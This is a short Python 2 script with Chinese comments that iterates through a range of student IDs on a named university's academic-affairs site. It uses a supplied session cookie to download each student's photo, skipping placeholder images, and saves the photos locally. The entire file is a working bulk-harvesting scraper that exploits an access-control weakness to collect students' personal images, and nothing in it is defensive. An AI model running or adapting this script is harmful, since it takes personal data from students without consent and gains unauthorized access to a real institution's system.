#!/usr/bin/python
# encoding:utf-8
import requests
import sys
from PIL import Image
from StringIO import StringIO
 
start_id = 478131 #开始的学生ID
end_id = 666666 #结束的学生ID
step = 1 #遍历步长
Cookie = 'xxxxxx'#填入教务Cookie
headers = {
    'Host': 'jw.qdu.edu.cn',
    'Proxy-Connection': 'keep-alive',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Referer': 'http://jw.qdu.edu.cn/academic/showHeader.do',
    'Accept-Encoding': 'gzip, deflate, sdch',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Cookie': Cookie
}
for id in range(start_id,end_id,step):
    str_id = str(id)
    pic_url='http://jw.qdu.edu.cn/academic/student/studentinfo/loadphoto_added.jsdo?primary=userid&kind=student&userid='+str_id
    binary = requests.post(pic_url,headers=headers)#发送URL和header，并且返回binary
    if(binary.url == 'http://jw.qdu.edu.cn/academic/common/security/login.jsp'):#检测返回binary的URL是否为cookie失败后的登陆页面
        print 'Cookie无效,请更换Cookie！'
        sys.exit(0)
    else:
        jpg = Image.open(StringIO(binary.content))#使binary转成jpg
        if(jpg.size == (90, 120) ):#根据大小检测遍历的图片是否为"暂无图片"
            print 'Not useful image : '+str_id+'.jpg' #输出显示"暂无图片"的ID
            jpg.close()
        else:
            jpg.save('pic/'+str_id+'.jpg') #保存至pic/xx.jpg
            jpg.close()
            print 'Successful to save image : '+str_id+'.jpg' #输出成功保存图片的ID
